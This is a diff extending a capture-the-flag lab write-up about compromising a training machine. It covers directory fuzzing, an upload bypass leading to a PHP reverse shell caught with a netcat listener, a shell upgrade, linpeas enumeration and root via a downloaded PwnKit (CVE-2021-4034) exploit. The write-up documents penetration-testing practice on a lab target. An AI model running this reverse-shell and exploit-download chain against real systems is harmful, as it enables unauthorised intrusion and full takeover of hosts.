@@ -1,3 +1,4 @@
+Day 1:
 Through ffuf we find that there is a /v2 directory which takes us to a login page
 where we can either login or register.
 
@@ -73,3 +74,155 @@ If we upload a jpg image (in this case I downloaded the default profile pic from
 immedietly sent back to the dashboard. This doesn't seem to happen with other
 filetypes. I should load up Burp at this point.
 
+Day 2:
+In http://10.10.132.235/v2/profile.php, when inspecting the source code for the
+submit-button, we find an interesting comment.
+<!-- /v2/profileimages/ -->
+
+This is probably a subdirectory containing the profile pictures, and the reason
+that ffuf didn't find it is because the wordlist used doesn't contain that word:
+
+$ cat ~/SecLists/Discovery/Web-Content/big.txt | grep profileimages | wc -l
+0
+
+We do have a few lists that does contain this word, so a lesson for the future
+is to not rely on a single wordlist, try out a few if one doesn't give results:
+grep -rl "profileimages" SecLists/*
+SecLists/Discovery/DNS/dns-Jhaddix.txt
+SecLists/Discovery/Web-Content/raft-large-words.txt
+SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+SecLists/Discovery/Web-Content/raft-large-directories.txt
+SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
+SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt
+SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+
+Lets try scanning with one of those lists instead, for example directory-list-lowercase-2.3-medium.txt:
+profileimages           [Status: 301, Size: 325, Words: 20, Lines: 10]
+
+Bingo!
+
+Since the machine is restarted since yesterday, it wont hold the files we uploaded,
+but lets see what is in it by default.
+
+When navigating to it, we get:
+Directory listing is disabled.
+
+Lets try uploading a file, and see if we can access it using the same name.
+Lets upload the default profile picture, named testfile.jpg.
+
+And it turns out that we can access it by navigating to:
+v2/profileimages/testfile.jpg
+
+Lets see what happens if we rename it to php and upload it.
+v2/profileimages/testfile.php
+
+We are able to access the file, and it's not displayed in the browser. Instead,
+Firefox tries to display the text.
+
+We have to keep in mind that even though the file is named .php, Linux still
+interprets it as a jpg file due to it's header:
+$ file testfile.php 
+testfile.php: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 256x256, frames 3
+
+Knowing this, lets try to upload the php-reverse-shell.php we fixed yesterday.
+And just to be careful, lets set up a listener on the AttackBox:
+$ nc -lvnp 4444
+
+When navigating to /v2/profileimages/php-reverse-shell.php we are showed a page with the message:
+WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111) 
+
+And we did not get a connection to our nc-listener.
+
+The reason for that is that the IP address I gave it is not the one I'm listening on, it's the AttackBox
+I have running on tryhackme. Lets upload a new shell with the correct IP-address.
+
+Lets look at it from the bright side. Now we will find out what happens it you
+upload a file with the same name as an already existing one.
+
+And bingo! We have a reverse-shell:
+Connection received on 10.10.132.235 33408
+Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 19:10:20 up  1:05,  0 users,  load average: 0.00, 0.00, 0.01
+ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+ uid=33(www-data) gid=33(www-data) groups=33(www-data)
+ /bin/sh: 0: can't access tty; job control turned off
+ $ id
+ uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Let's try to get a more stable shell.
+We can run this, which gives us a bash-shell:
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+But we still don't have things like tab-completion.
+Following the instruction on the third option on this page gives me what I'm looking for:
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+
+Now we have a fully-ish featured shell which hopefully will not kick us out after
+an arbitrary time.
+
+Now lets find the user-flag. For some reason www-data can list the directory of
+the user "webdeveloper":
+www-data@sky:/home/webdeveloper$ ls /home/webdeveloper/
+user.txt
+
+And we find the flag:
+$ cat /home/webdeveloper/user.txt
+********************************
+
+Now lets see if we can privilege escalate.
+
+In /home/webdeveloper, there is one directory we can access as www-data:
+www-data@sky:/home/webdeveloper$ ls -la
+total 36
+drwxr-xr-x 4 webdeveloper webdeveloper 4096 Oct  8  2021 .
+drwxr-xr-x 3 root         root         4096 May 25  2021 ..
+lrwxrwxrwx 1 webdeveloper webdeveloper    9 May 25  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 webdeveloper webdeveloper  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 webdeveloper webdeveloper 3771 Feb 25  2020 .bashrc
+drwx------ 2 webdeveloper webdeveloper 4096 May 25  2021 .cache
+drwxrwxr-x 3 webdeveloper webdeveloper 4096 May 25  2021 .local
+-rw------- 1 webdeveloper webdeveloper   51 Oct  8  2021 .mysql_history
+-rw-r--r-- 1 webdeveloper webdeveloper  807 Feb 25  2020 .profile
+-rw-r--r-- 1 webdeveloper webdeveloper    0 Oct  7  2021 .sudo_as_admin_successful
+-rw-r--r-- 1 webdeveloper webdeveloper   33 May 25  2021 user.txt
+
+No real luck with manually digging through, so we are running linpeas.sh and see if it finds something.
+
+It reveals a few things, among which is a few CVE:s that it may be vulnerable to:
+www-data@sky:/tmp$ cat linpeas.txt |grep CVE
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-4034
+Vulnerable to CVE-2021-3560
+[+] [CVE-2021-4034] PwnKit
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+[+] [CVE-2021-3156] sudo Baron Samedit
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+
+Let's try the first one (CVE-2021-4034). Mostly because there is an easy-to-use
+exploit readily available on github:
+https://github.com/berdav/CVE-2021-4034
+
+Once we got it downloaded and compiled on the AttackBox, we can start a http-server
+so we can download it on the server:
+$ python3 -m http.server
+
+And on the compromised server:
+www-data@sky:/tmp$ wget http://10.10.2.212:8000/cve.tar.gz
+
+Unpack it and run the dry-run binary to see if the server is vulnerable:
+www-data@sky:/tmp/CVE-2021-4034$ ./dry-run/dry-run-cve-2021-4034
+root
+
+Yup, and now we can run the exploit and get root:
+www-data@sky:/tmp/CVE-2021-4034$ ./cve-2021-4034
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+And in /root/root.txt we find the flag:
+# cat /root/root.txt
+********************************
